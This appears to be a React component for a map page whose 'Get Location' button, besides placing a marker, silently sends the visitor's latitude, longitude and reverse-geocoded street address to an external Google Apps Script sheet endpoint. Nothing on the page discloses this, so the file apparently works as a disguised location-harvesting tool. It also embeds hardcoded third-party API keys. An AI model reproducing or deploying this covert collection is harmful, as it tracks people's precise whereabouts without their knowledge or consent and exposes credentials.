

import React, { useEffect, useState } from "react";
import L from 'leaflet'; // Import leaflet
import "./home.css";

const Home = () => {


    // <script>
    //   const scriptURL = 'https://script.google.com/macros/s/AKfycbw3hpxEke69DL_hlpO6PF1MBv0g-kopY8uk8q1n49oQqN4vX_fcCDLx3fFqdSMCA9ZF/exec'
    //   const form = document.forms['submit-to-google-sheet']

    //   form.addEventListener('submit', e => {
    //     e.preventDefault()
    //     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    //       .then(response => console.log('Success!', response))
    //       .catch(error => console.error('Error!', error.message))
    //   })
    // </script>

    const [map, setMap] = useState(null);

    // Initialize the map when the component mounts
    useEffect(() => {
        const mapInstance = L.map('map').setView([19.0760, 72.8777], 13); // Initial position (Mumbai)

        L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);

        setMap(mapInstance); // Store the map instance

        return () => {
            mapInstance.remove(); // Clean up the map instance on component unmount
        };
    }, []);

    const getUserLocation = () => {

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, showError);



        } else {
            alert("Geolocation is not supported by this browser.");
        }
    };

    const showPosition = async(position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;


        console.log(latitude, longitude);
        // Yaha se sheet par append hoga
        let address=await  fetch(`https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}&api_key=6738b29019e06277206992oax4a529f`)
        address=await address.json()
        // console.log(address.display_name)
        let org_address=address.display_name

        const scriptURL = 'https://script.google.com/macros/s/AKfycbw3hpxEke69DL_hlpO6PF1MBv0g-kopY8uk8q1n49oQqN4vX_fcCDLx3fFqdSMCA9ZF/exec'
        


      
       // Use FormData to send the latitude and longitude to the Google Sheets API
       const formData = new FormData();
       formData.append('latitude', latitude);
       formData.append('longitude', longitude);
       formData.append('address', org_address)
        
       fetch(scriptURL, { method: 'POST', body: formData })
        //    .then(response => console.log('Success!', response))
           .catch(error => console.error('Error!', error.message));

        // yaha pura kaam hojaye ga aappend karne wala
        if (map) {
            map.setView([latitude, longitude], 15);

            L.marker([latitude, longitude]).addTo(map)
                .bindPopup('You are here')
                .openPopup();
        }

        const link = `https://api.geoapify.com/v1/geocode/reverse?lat=${latitude}&lon=${longitude}&lang=fr&apiKey=0ace78bf8d1b46b1b759906490aeec05`;
        // console.log(link); // You can use this link to fetch additional location info if needed.
    };

    const showError = (error) => {
        switch (error.code) {
            case error.PERMISSION_DENIED:
                alert("User denied the request for Geolocation.");
                break;
            case error.POSITION_UNAVAILABLE:
                alert("Location information is unavailable.");
                break;
            case error.TIMEOUT:
                alert("The request to get user location timed out.");
                break;
            case error.UNKNOWN_ERROR:
                alert("An unknown error occurred.");
                break;
            default:
                alert("An error occurred while fetching location.");
        }
    };

    return (
        <section>
            <div className="main-body">
                <div className="body-head">
                    {/* <h1>Kaise ho, Hum aa gaye</h1> */}
                </div>

                <div className="mapsection">        {/* style="height: 300px; z-index:0"  map mai dalna hai*/}
                    <div id="map" style={{ height: '340px', zIndex: 0 }}></div>
                </div>
                <div className="btn-section">
                    <button className="map-btn" onClick={getUserLocation}>Get Location</button>
                </div>

            </div>
            <div className="footer">
                <h4><span>No Policy Refund. Copyright 2017</span></h4>
            </div>
        </section >
    );
};

export default Home;
// https://script.google.com/macros/s/AKfycbw3hpxEke69DL_hlpO6PF1MBv0g-kopY8uk8q1n49oQqN4vX_fcCDLx3fFqdSMCA9ZF/exec